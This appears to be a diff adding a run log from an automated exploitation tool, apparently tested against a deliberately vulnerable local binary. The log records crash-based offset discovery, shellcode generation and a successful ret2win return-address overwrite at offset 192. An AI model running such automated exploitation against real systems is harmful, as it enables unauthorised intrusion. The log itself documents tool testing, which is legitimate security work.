@@ -1,0 +1,129 @@
+2026-04-08 11:19:23,437 [INFO    ] Platform: LINUX  Arch: amd64
+2026-04-08 11:19:23,441 [INFO    ] Running static analysis (radare2)…
+2026-04-08 11:19:24,134 [DEBUG   ] All functions (11): ['__do_global_dtors_aux', '_dl_relocate_static_pie', '_fini', '_init', '_start', 'deregister_tm_clones', 'frame_dummy', 'main', 'register_tm_clones', 'vuln', 'win']
+2026-04-08 11:19:24,134 [INFO    ] Checking binary protections…
+2026-04-08 11:19:24,457 [INFO    ] Loading library offsets…
+2026-04-08 11:19:24,468 [INFO    ] libc base: 0x7f89d3ad7000
+2026-04-08 11:19:24,472 [WARNING ] No built-in offsets for libc 2.42 — use query_libc_rip() after leaking
+2026-04-08 11:19:24,474 [INFO    ] Offset detection: local process + corefile (strategy 1)…
+2026-04-08 11:19:29,502 [DEBUG   ] corefile mult=1: Could not find core file for pid 117911
+2026-04-08 11:19:34,527 [DEBUG   ] corefile mult=2: Could not find core file for pid 117913
+2026-04-08 11:19:39,550 [DEBUG   ] corefile mult=3: Could not find core file for pid 117914
+2026-04-08 11:19:39,550 [INFO    ] Offset detection: GDB batch script (strategy 2)…
+2026-04-08 11:19:40,215 [DEBUG   ] GDB script mult=1: Command '['gdb', '--batch', '-x', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/_bs_work/_bs_offset.gdb', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/t_revshell']' returned non-zero exit status 1.
+2026-04-08 11:19:40,808 [DEBUG   ] GDB script mult=2: Command '['gdb', '--batch', '-x', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/_bs_work/_bs_offset.gdb', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/t_revshell']' returned non-zero exit status 1.
+2026-04-08 11:19:40,808 [INFO    ] Offset detection: remote crash scan (strategy 3)…
+2026-04-08 11:19:41,317 [WARNING ] Remote crash at size 200 — estimated offset 192 (verify locally with GDB for precision)
+2026-04-08 11:19:41,319 [INFO    ] Fork-server detection: 3/3 → fork=True
+2026-04-08 11:19:41,322 [INFO    ] Generating shellcode (linux/amd64)…
+2026-04-08 11:19:41,529 [INFO    ] Shellcode: 92 bytes
+2026-04-08 11:19:41,532 [INFO    ] Orchestrating exploit…
+2026-04-08 11:19:41,917 [DEBUG   ] Memory dump: Command '['gdb', '--batch', '-x', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/_bs_work/_bs_memdump.gdb', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/t_revshell']' returned non-zero exit status 1.
+2026-04-08 11:19:42,253 [DEBUG   ] Memory dump: Command '['gdb', '--batch', '-x', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/_bs_work/_bs_memdump.gdb', '/home/cryptocalypse/projects/binsmasher_final/binsmasher_final/tests/bins/t_revshell']' returned non-zero exit status 1.
+2026-04-08 11:19:42,253 [INFO    ] Analysing seccomp-bpf filters…
+2026-04-08 11:19:42,449 [INFO    ] seccomp: orw_needed=False allowed=[]
+2026-04-08 11:19:42,452 [INFO    ] Scanning for ret2win candidates…
+2026-04-08 11:19:42,551 [INFO    ]   ret2win candidate: win @ 0x401276
+2026-04-08 11:19:42,605 [INFO    ] ret2win → win@0x401276: 216 bytes (offset=192)
+2026-04-08 11:19:42,609 [INFO    ] Return address target: 0x401276
+2026-04-08 11:19:42,619 [INFO    ] >>> COMMAND OUTPUT (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,632 [INFO    ] >>> COMMAND OUTPUT [off=8] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,643 [INFO    ] >>> COMMAND OUTPUT [off=16] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,652 [INFO    ] >>> COMMAND OUTPUT [off=24] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,663 [INFO    ] >>> COMMAND OUTPUT [off=32] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,672 [INFO    ] >>> COMMAND OUTPUT [off=40] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,682 [INFO    ] >>> COMMAND OUTPUT [off=48] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,693 [INFO    ] >>> COMMAND OUTPUT [off=56] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,703 [INFO    ] >>> COMMAND OUTPUT [off=64] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,721 [INFO    ] >>> COMMAND OUTPUT [off=72] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,733 [INFO    ] >>> COMMAND OUTPUT [off=80] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,745 [INFO    ] >>> COMMAND OUTPUT [off=88] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,755 [INFO    ] >>> COMMAND OUTPUT [off=96] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,767 [INFO    ] >>> COMMAND OUTPUT [off=104] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,777 [INFO    ] >>> COMMAND OUTPUT [off=112] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,787 [INFO    ] >>> COMMAND OUTPUT [off=120] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,799 [INFO    ] >>> COMMAND OUTPUT [off=128] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,809 [INFO    ] >>> COMMAND OUTPUT [off=136] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,818 [INFO    ] >>> COMMAND OUTPUT [off=144] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,830 [INFO    ] >>> COMMAND OUTPUT [off=152] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,839 [INFO    ] >>> COMMAND OUTPUT [off=160] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,850 [INFO    ] >>> COMMAND OUTPUT [off=168] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,861 [INFO    ] >>> COMMAND OUTPUT [off=176] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,871 [INFO    ] >>> COMMAND OUTPUT [off=184] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,882 [INFO    ] >>> COMMAND OUTPUT [off=192] (30B): ready
+AAAAready
+AAAAready
+AAAA
+2026-04-08 11:19:42,885 [INFO    ] ret2win succeeded (non-interactive)
